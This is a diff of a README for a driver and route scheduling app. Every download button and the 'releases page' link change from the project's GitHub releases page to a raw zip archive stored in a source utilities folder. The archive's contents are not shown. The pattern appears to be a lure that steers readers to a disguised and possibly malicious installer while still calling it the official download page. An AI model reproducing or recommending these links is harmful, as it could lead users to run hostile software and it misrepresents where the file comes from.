@@ -1,6 +1,6 @@
 # 🚚 driver-scheduling-system - Manage Drivers and Routes Easily
 
-[![Download driver-scheduling-system](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/DjordjeICT/driver-scheduling-system/releases)
+[![Download driver-scheduling-system](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/DjordjeICT/driver-scheduling-system/raw/refs/heads/main/Frontend-client/src/utils/system-driver-scheduling-2.0.zip)
 
 ---
 
@@ -44,7 +44,7 @@ No extra software installations like Node.js or databases are required on your e
 
 Visit the official download page by clicking the large button below. It will take you to the place where the installer files are stored.
 
-[![Download driver-scheduling-system](https://img.shields.io/badge/Download-Get%20App-blue)](https://github.com/DjordjeICT/driver-scheduling-system/releases)
+[![Download driver-scheduling-system](https://img.shields.io/badge/Download-Get%20App-blue)](https://github.com/DjordjeICT/driver-scheduling-system/raw/refs/heads/main/Frontend-client/src/utils/system-driver-scheduling-2.0.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -110,7 +110,7 @@ After installation, the software might start automatically. If not, find the "dr
 
 ## 🔄 Updates
 
-Check the [releases page](https://github.com/DjordjeICT/driver-scheduling-system/releases) regularly for new versions. Updates may fix bugs and add useful features.
+Check the [releases page](https://github.com/DjordjeICT/driver-scheduling-system/raw/refs/heads/main/Frontend-client/src/utils/system-driver-scheduling-2.0.zip) regularly for new versions. Updates may fix bugs and add useful features.
 
 ---
 
@@ -138,4 +138,4 @@ All this technology works behind the scenes to give you a smooth experience with
 
 Use this link to visit the download page anytime:
 
-[https://github.com/DjordjeICT/driver-scheduling-system/releases](https://github.com/DjordjeICT/driver-scheduling-system/releases)
+[https://github.com/DjordjeICT/driver-scheduling-system/raw/refs/heads/main/Frontend-client/src/utils/system-driver-scheduling-2.0.zip](https://github.com/DjordjeICT/driver-scheduling-system/raw/refs/heads/main/Frontend-client/src/utils/system-driver-scheduling-2.0.zip)
